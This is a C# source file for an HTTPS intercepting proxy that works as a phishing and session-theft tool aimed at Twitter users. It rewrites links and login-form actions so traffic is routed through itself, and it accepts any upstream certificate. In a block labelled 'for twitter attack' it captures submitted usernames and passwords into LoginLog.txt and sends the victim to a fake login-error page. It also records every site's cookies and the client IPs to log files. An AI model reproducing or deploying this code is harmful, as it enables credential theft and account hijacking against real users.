﻿using System;
using System.Configuration;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Net.Sockets;
using System.Net.Security;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using HtmlAgilityPack;

namespace HTTPProxyServer
{
    public sealed class ProxyServer
    {
        private static readonly ProxyServer _server = new ProxyServer();

        private static readonly int BUFFER_SIZE = 8192;
        private static readonly char[] semiSplit = new char[] { ';' };
        private static readonly char[] equalSplit = new char[] { '=' };
        private static readonly String[] colonSpaceSplit = new string[] { ": " };
        private static readonly char[] spaceSplit = new char[] { ' ' };
        private static readonly char[] commaSplit = new char[] { ',' };
        private static readonly Regex cookieSplitRegEx = new Regex(@",(?! )");
        private static X509Certificate _certificate;
        private static object _outputLockObj = new object();
        private static string url = "";
        private static string lastUrl = "";
        private static string currenHost = "";


        private TcpListener _listener;
        private Thread _listenerThread;

        public IPAddress ListeningIPInterface
        {
            get
            {
                IPAddress addr = IPAddress.Loopback;
                if (ConfigurationManager.AppSettings["ListeningIPInterface"] != null)
                    IPAddress.TryParse(ConfigurationManager.AppSettings["ListeningIPInterface"], out addr);

                return addr;
            }
        }

        public Int32 ListeningPort
        {
            get
            {
                Int32 port = 8081;
                if(ConfigurationManager.AppSettings["ListeningPort"] != null)
                    Int32.TryParse(ConfigurationManager.AppSettings["ListeningPort"],out port);
                
                return port;
            }
        }

        private ProxyServer()
        {
            _listener = new TcpListener(ListeningIPInterface, ListeningPort);
            ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
            _certificate = createCertificate();
            Console.WriteLine("Logger Path: " + Directory.GetCurrentDirectory());

        }


        public static ProxyServer Server
        {
            get { return _server; }
        }

        public bool Start()
        {

                
              _listener.Start();
         

            _listenerThread = new Thread(new ParameterizedThreadStart(Listen));

            _listenerThread.Start(_listener);

            return true;
        }

        public void Stop()
        {
            _listener.Stop();

            //wait for server to finish processing current connections...

            _listenerThread.Abort();
            _listenerThread.Join();
            _listenerThread.Join();
        }

        private static void Listen(Object obj)
        {
            TcpListener listener = (TcpListener)obj;
            try
            {
                while (true)
                {
                    TcpClient client = listener.AcceptTcpClient();
                    while (!ThreadPool.QueueUserWorkItem(new WaitCallback(ProxyServer.ProcessClient), client)) ;
                }
            }
            catch (ThreadAbortException) { }
            catch (SocketException) { }
        }


        private static void ProcessClient(Object obj)
        {
            TcpClient client = (TcpClient)obj;
            try
            {
                DoHttpProcessing(client);
            }
            catch (Exception ex)
            {

            }
            finally
            {
                client.Close();
            }
        }

        private static void DoHttpProcessing(TcpClient client)
        {
            
            Stream clientStream = client.GetStream();
            Stream outStream = null; //use this stream for writing out - may change if we use ssl
            SslStream sslStream = null;
            StreamReader clientStreamReader = null;
            bool uriHasChanged = false;
            string remoteUri = "";


            
            try
            {
               sslStream = new SslStream(client.GetStream());
                sslStream.AuthenticateAsServer(_certificate,false,SslProtocols.Tls,true);
                outStream = sslStream;
                string message = ReadMessage(sslStream);
                if (message == "")
                    return;
                byte[] byteArray = Encoding.UTF8.GetBytes(message);
                MemoryStream stream = new MemoryStream(byteArray);
                clientStreamReader =  new StreamReader(stream);
                String httpCmd = clientStreamReader.ReadLine();
                if (String.IsNullOrEmpty(httpCmd))
                {
                    clientStreamReader.Close();
                    clientStream.Close();
                    return;
                }
                //break up the line into three components
                String[] splitBuffer = httpCmd.Split(spaceSplit, 3);

                String method = splitBuffer[0];
 

                if((method=="GET" || method == "POST"))
                {
                    remoteUri = updateUri(message, client);

                    if ((currenHost == "" || !remoteUri.Contains(currenHost)) && (!remoteUri.Contains(".css")))
                    {
                        currenHost = remoteUri;

                        string time = DateTime.Now.ToString();
                        string ipAddress = ((IPEndPoint)client.Client.RemoteEndPoint).Address.ToString();
                        Console.WriteLine("Connection:");
                        Console.WriteLine("Time : " + time);
                        Console.WriteLine("IP Address : " + ipAddress);
                        Console.WriteLine("Site Url : " + url);

                        using (StreamWriter outputFile = new StreamWriter(Directory.GetCurrentDirectory() + @"\ConnectionLog.txt", true))
                        {
                            outputFile.Write("Connection:");
                            outputFile.WriteLine("Time : " + time);
                            outputFile.WriteLine("IP Address : " + ipAddress);
                            outputFile.WriteLine("Site Url : " + url);
                            makeSpaceBetweenRecords(outputFile);

                        }


                    }




                   
                    Version version = new Version(1, 0);

                    HttpWebRequest webReq = null;
                    HttpWebResponse response = null;

                    //for twitter attack
                    if (method.Contains("POST") && remoteUri.Contains("twitter.com/sessions"))
                    {
                        string responseFromTwitter = fetchUserCradentialsAndUpdateUser(message);
                        string[] messageParts = message.Split(new string[] { "username_or_email%5D=", "password%5D=" }, StringSplitOptions.None);
                        string time = DateTime.Now.ToString();
                        string userIp = ((IPEndPoint) client.Client.RemoteEndPoint).Address.ToString();
                        string userName = messageParts[1].Split('&')[0];
                        string password = messageParts[2].Split('&')[0];
                        writeLoginToConsoleAndFile(time,userIp, userName, password);
                        byte[] responseInBytes = Encoding.UTF8.GetBytes(responseFromTwitter);
                        sslStream.Write(responseInBytes);
                    }

                    else {

                        if (remoteUri.Contains("twitter"))
                        {
                            if (!remoteUri.Contains("https"))
                                webReq = (HttpWebRequest) HttpWebRequest.Create("https://" + remoteUri);
                            else webReq = (HttpWebRequest) HttpWebRequest.Create(remoteUri);
                        }

                        else
                        {

                                if (!remoteUri.Contains("http"))
                                {
                                    webReq = (HttpWebRequest) HttpWebRequest.Create("http://" + remoteUri);
                                }
                                else
                                {
                                    webReq = (HttpWebRequest) HttpWebRequest.Create(remoteUri);
                                }

                        }

                        webReq.Method = method;
                        webReq.ProtocolVersion = version;
                        webReq.Proxy = null;
                        webReq.AutomaticDecompression = DecompressionMethods.None;
                        

                    //read the request headers from the client and copy them to our request
                        int contentLen = ReadRequestHeaders(clientStreamReader, webReq);
                        webReq.KeepAlive = true;
                        webReq.AllowAutoRedirect = false;



                         if (method.ToUpper() == "POST")
                           {
                                    char[] postBuffer = new char[contentLen];
                                    int bytesRead;
                                    int totalBytesRead = 0;
                                    StreamWriter sw = new StreamWriter(webReq.GetRequestStream());
                                    while (totalBytesRead < contentLen &&
                                           (bytesRead = clientStreamReader.ReadBlock(postBuffer, 0, contentLen)) > 0)
                                    {
                                        totalBytesRead += bytesRead;
                                        sw.Write(postBuffer, 0, bytesRead);

                                    }


                               sw.Close();
                    }



                    webReq.Timeout = 15000;

                    try
                    {
                        response = (HttpWebResponse) webReq.GetResponse();
                    }
                    catch (WebException webEx)
                    {
                        response = webEx.Response as HttpWebResponse;
                    }
                        if (response != null)
                        {
                            List<Tuple<String, String>> responseHeaders = ProcessResponse(response);
                            StreamWriter myResponseWriter = new StreamWriter(outStream);
                            Stream responseStream = response.GetResponseStream();
                            try
                            {
                                //send the response status and response headers
                                WriteResponseStatus(response.StatusCode, response.StatusDescription, myResponseWriter);
                                WriteResponseHeaders(myResponseWriter, responseHeaders);


                                byte[] resultArray = updateResponseLinks(responseStream, remoteUri);
                                if (resultArray != null)
                                {
                                    responseStream = new MemoryStream(resultArray);
                                }



                                DateTime? expires = null;
                                Byte[] buffer;
                                if (response.ContentLength > 0)
                                    buffer = new Byte[response.ContentLength];
                                else
                                    buffer = new Byte[BUFFER_SIZE];

                                int bytesRead;


                                while ((bytesRead = responseStream.Read(buffer, 0, buffer.Length)) > 0)
                                {
                                    outStream.Write(buffer, 0, bytesRead);

                                }

                                responseStream.Close();


                                outStream.Flush();

                                foreach (Cookie cookie in response.Cookies)
                                {
                                    writeCookiesToFile(DateTime.Now.ToString(), ((IPEndPoint)client.Client.RemoteEndPoint).Address.ToString(), url, cookie.Name, cookie.Value);
                                }

                            }
                            catch (Exception ex)
                            {
                            }
                            finally
                            {
                                responseStream.Close();
                                response.Close();
                                myResponseWriter.Close();
                            }
                        }
                    }
                }else
                {
                    StringBuilder sBuilder = new StringBuilder();
                    sBuilder.AppendLine("HTTP/1.1 405  Method Not Allowed");
                    sBuilder.AppendLine(Environment.NewLine);
                    sBuilder.AppendLine(Environment.NewLine);

                    byte[] messageToUser = Encoding.UTF8.GetBytes(sBuilder.ToString());
                    sslStream.Write(messageToUser);
                    sslStream.Close();
                    
                }

            }
            catch (Exception ex)
            {
            }
            finally
            {


                clientStreamReader.Close();
                clientStream.Close();
                if (sslStream != null)
                    sslStream.Close();
                outStream.Close();

            }

        }

        private static void writeLoginToConsoleAndFile(string currentTime, string userIpAddress, string uName, string userPassword)
        {
            uName = uName.Replace("%40", "@");
            Console.WriteLine("User Login: Tim" + currentTime + " " + userIpAddress + " " + uName + " " + userPassword);
            using (StreamWriter outputFile = new StreamWriter(Directory.GetCurrentDirectory() + @"\LoginLog.txt", true))
            {
                outputFile.WriteLine("Time and data : " + currentTime);
                outputFile.WriteLine("IP Address : " + userIpAddress);
                outputFile.WriteLine("UserName / Email : " + uName);
                outputFile.WriteLine("Password : " + userPassword);
                makeSpaceBetweenRecords(outputFile);
               
            }
        }

        private static string updateUri(string message,TcpClient client)
        {
            string[] reqParts = message.Split(new string[] { " " }, StringSplitOptions.None);
            if (reqParts[1].Contains("url="))
            {
                url = reqParts[1].Split(new string[] { "/?url=" }, StringSplitOptions.None)[1];
                lastUrl = url;


                    
                

            }
            else
            {
                url = lastUrl + reqParts[1];
            }

            return url;
        }

        private static void writeSiteLoginToFile(string currentTime, string userIpAddress, string siteUrl)
        {
            Console.WriteLine("Connect to site : "+siteUrl+" Time : "+currentTime+" Ip Address : " + userIpAddress);
            using (StreamWriter outputFile = new StreamWriter(Directory.GetCurrentDirectory() + @"\ConnectionLog.txt", true))
            {
                outputFile.WriteLine("Time and data : " + currentTime);
                outputFile.WriteLine("IP Address : " + userIpAddress);
                outputFile.WriteLine("Url site : " + siteUrl);
                
                makeSpaceBetweenRecords(outputFile);
            }
        }

        private static void makeSpaceBetweenRecords(StreamWriter outputFile)
        {
            outputFile.WriteLine();
            outputFile.WriteLine();
            outputFile.WriteLine();
        }


        private static byte[] updateResponseLinks(Stream responseStream, string remoteUri)
        {
            string res;
            using (var decompress = new GZipStream(responseStream, CompressionMode.Decompress))
            using (var sr = new StreamReader(decompress))
            {
                res = sr.ReadToEnd();
                if (!String.IsNullOrEmpty(res))
                {
                    res = switchLinks(res, remoteUri);
                    byte[] array = Encoding.UTF8.GetBytes(res);
                    Stream ms = new MemoryStream(array);
                    byte[] result = Compress(ms);
                    return result;

                }


            }
                            return null;

        }

        private static List<Tuple<String,String>> ProcessResponse(HttpWebResponse response)
        {
            String value=null;
            String header=null;
            List<Tuple<String, String>> returnHeaders = new List<Tuple<String, String>>();
            foreach (String s in response.Headers.Keys)
            {
                if (s.ToLower() == "set-cookie")
                {
                    header = s;
                    value = response.Headers[s];
                }
                else if(s.ToLower() == "content-length")
                    continue;
                else
                    returnHeaders.Add(new Tuple<String, String>(s, response.Headers[s]));
            }
            
            if (!String.IsNullOrWhiteSpace(value))
            {
                response.Headers.Remove(header);
                String[] cookies = cookieSplitRegEx.Split(value);
                foreach (String cookie in cookies)
                    returnHeaders.Add(new Tuple<String, String>("Set-Cookie", cookie));

            }
            returnHeaders.Add(new Tuple<String, String>("X-Proxied-By", "matt-dot-net proxy"));
            return returnHeaders;
        }

        private static void WriteResponseStatus(HttpStatusCode code, String description, StreamWriter myResponseWriter)
        {
            String s = String.Format("HTTP/1.0 {0} {1}", (Int32)code, description);
            myResponseWriter.WriteLine(s);

        }

        private static void WriteResponseHeaders(StreamWriter myResponseWriter, List<Tuple<String,String>> headers)
        {
            if (headers != null)
            {
                foreach (Tuple<String,String> header in headers)
                    myResponseWriter.WriteLine(String.Format("{0}: {1}", header.Item1,header.Item2));
            }
            myResponseWriter.WriteLine();
            myResponseWriter.Flush();

        }



        private static int ReadRequestHeaders(StreamReader sr, HttpWebRequest webReq)
        {

            String httpCmd;
            int contentLen = 0;
            do
            {
                httpCmd = sr.ReadLine();
                if (String.IsNullOrEmpty(httpCmd))
                    return contentLen;
                String[] header = httpCmd.Split(colonSpaceSplit, 2, StringSplitOptions.None);
                switch (header[0].ToLower())
                {
                    case "host":
                        webReq.Host = webReq.Host;
                        break;
                    case "user-agent":
                        webReq.UserAgent = header[1];
                        break;
                    case "accept":
                        webReq.Accept = header[1];
                        break; 
                    case "referer":
                        webReq.Referer = header[1];
                  
                        break;
                    case "cookie":
                        webReq.Headers["Cookie"] = header[1];
                        break;
                    case "proxy-connection":
                    case "connection":
                    case "keep-alive":
                        //ignore these
                        break;
                    case "content-length":
                        int.TryParse(header[1], out contentLen);
                        break;
                    case "content-type":
                        webReq.ContentType = header[1];
                        break;
                    case "if-modified-since":
                        String[] sb = header[1].Trim().Split(semiSplit);
                        DateTime d;
                        if (DateTime.TryParse(sb[0], out d))
                            webReq.IfModifiedSince = d;
                        break;
                    default:
                        try
                        {
                            webReq.Headers.Add(header[0], header[1]);
                        }
                        catch (Exception ex)
                        {
                        }
                        break;
                }
            } while (!String.IsNullOrWhiteSpace(httpCmd));
            return contentLen;
        }
        private X509Certificate createCertificate()
        {

            byte[] c = Certificate.CreateSelfSignCertificatePfx(
                       "CN=localhost", //host name
                        DateTime.Parse("2015-01-01"), //not valid before
                        DateTime.Parse("2020-01-01"), //not valid after
                        "sslpass"); //userPassword to encrypt key file
            using (BinaryWriter binWriter = new BinaryWriter(File.Open(@"cert.pfx", FileMode.Create)))
            {
                binWriter.Write(c);
            }

            return new X509Certificate2(@"cert.pfx", "sslpass");
        }
        static string ReadMessage(SslStream sslStream)
        {
            // Read the  message sent by the server.
            // The end of the message is signaled using the
            // "<EOF>" marker.
            byte[] buffer = new byte[2048];
            StringBuilder messageData = new StringBuilder();
            int bytes = -1;
            do
            {
                bytes = sslStream.Read(buffer, 0, buffer.Length);

                // Use Decoder class to convert from bytes to UTF8
                // in case a character spans two buffers.
                Decoder decoder = Encoding.UTF8.GetDecoder();
                char[] chars = new char[decoder.GetCharCount(buffer, 0, bytes)];
                decoder.GetChars(buffer, 0, bytes, chars, 0);
                messageData.Append(chars);
                // Check for EOF.
                if (messageData.ToString().IndexOf("\r\n\r\n") != -1)
                {
                    break;
                }
            } while (bytes != 0);

            return messageData.ToString();
        }
        private static string switchLinks(string textResponse, string url)
        {
            try
            {
                HtmlDocument document = new HtmlDocument();
                document.LoadHtml(textResponse);
                Uri startUri = new Uri("https://localhost:443/?url=");
                bool isTwitterUrl = url.Contains("twitter.com");
                string linkHref = "//link[@href]";
              //  string imgSrc = "//img[@src]";
                string aHref = "//a[@href]";
                if (document.DocumentNode.SelectNodes(aHref) != null ||
                  /*  document.DocumentNode.SelectNodes(imgSrc) != null ||*/
                    document.DocumentNode.SelectNodes(linkHref) != null)
                {
                    if (document.DocumentNode.SelectNodes(aHref) != null)
                    {
                        string uriString = "http://" + url;
                        foreach (HtmlNode node in document.DocumentNode.SelectNodes(aHref))
                        {
                            string attributeValue = node.Attributes["href"].Value;
                            if (!String.IsNullOrEmpty(attributeValue))
                            {
                                Uri firstStep = new Uri(uriString);
                                Uri secondStep = new Uri(firstStep, attributeValue);
                                attributeValue = startUri + secondStep.AbsoluteUri;
                                node.Attributes["href"].Value = attributeValue;

                            }

                        }
 
                        if (document.DocumentNode.SelectNodes(linkHref) != null)
                        {
                            foreach (HtmlNode node in document.DocumentNode.SelectNodes(linkHref))
                            {
                                string attributeValue = node.Attributes["href"].Value;
                                if (!String.IsNullOrEmpty(attributeValue))
                                {
                                    Uri firstStep = new Uri(uriString);
                                    Uri secondStep = new Uri(firstStep, attributeValue);
                                    attributeValue = startUri + secondStep.AbsoluteUri;
                                    node.Attributes["href"].Value = attributeValue;

                                }

                            }
                        }
                        if (isTwitterUrl)
                        {
                            foreach (HtmlNode node in document.DocumentNode.SelectNodes("//form[@action]"))
                            {
                                string attributeValue = node.Attributes["action"].Value;
                                if (!String.IsNullOrEmpty(attributeValue))
                                {
                                    Uri firstStep = new Uri(uriString);
                                    Uri secondStep = new Uri(firstStep, attributeValue);
                                    attributeValue = startUri + secondStep.AbsoluteUri;
                                    node.Attributes["action"].Value = attributeValue;

                                }

                            }


                        }
                    }
                }
                return document.DocumentNode.OuterHtml;


            }
            catch (Exception e)
            {
                return "";
            }






        }

        private static byte[] Compress(Stream input)
        {
            using (var compressStream = new MemoryStream())
            using (var compressor = new GZipStream(compressStream, CompressionMode.Compress))
            {
                input.CopyTo(compressor);
                compressor.Close();
                return compressStream.ToArray();
            }
        }
        public static string fetchUserCradentialsAndUpdateUser(string userMessageDetails)
        {

            string[] userMessageParts = userMessageDetails.Split(new string[] { "username_or_email%5D=", "password%5D=" }, StringSplitOptions.None);
            string username = userMessageParts[1].Split('&')[0];
            username = username.Replace("%40", "@");
            string password = userMessageParts[2].Split('&')[0];
            StringBuilder stringBuilder = new StringBuilder();
            setErrorToUser(stringBuilder, username);
            return stringBuilder.ToString();
        }

        private static void setErrorToUser(StringBuilder stringBuilder, string username)
        {
            stringBuilder.AppendLine("HTTP/1.1 301 Moved Permanently");
            stringBuilder.AppendLine("Connection: close");
            stringBuilder.AppendLine("Location: https://www.twitter.com/login/error?username_or_email=" + username);

        }

        public static void writeCookiesToFile(string currentTime, string userIpAddress, string siteUrl, string cookieName, string cookieValue)
        {
            Console.WriteLine("Cookie: Current Time :" + currentTime + " " + userIpAddress + " " + siteUrl + " " + cookieName + " " + cookieValue);
            using (StreamWriter outputFile = new StreamWriter(Directory.GetCurrentDirectory() + @"\CookiesLog.txt", true))
            {
                outputFile.WriteLine("Time and data : " + currentTime);
                outputFile.WriteLine("IP Address : " + userIpAddress);
                outputFile.WriteLine("Url site : " + siteUrl);
                outputFile.WriteLine("Cookie name : " + cookieName);
                outputFile.WriteLine("Cookie value : " + cookieValue);
                makeSpaceBetweenRecords(outputFile);
            }
        }
        
    }




              
    
}
